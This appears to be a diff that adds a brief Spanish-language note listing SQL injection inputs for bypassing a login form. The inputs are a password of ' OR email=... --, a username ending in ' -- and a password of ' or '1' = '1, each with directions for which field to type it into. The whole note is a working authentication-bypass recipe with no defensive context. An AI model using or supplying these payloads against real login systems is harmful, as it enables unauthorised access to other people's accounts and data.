@@ -1,0 +1,8 @@
+En el password se escribe: (es importe el espacio despues de --
+' OR email='un email conocido' -- 
+
+En el Usuario se escribe:
+nombreUsuario' -- 
+
+En el password se escribe:
+' or '1' = '1
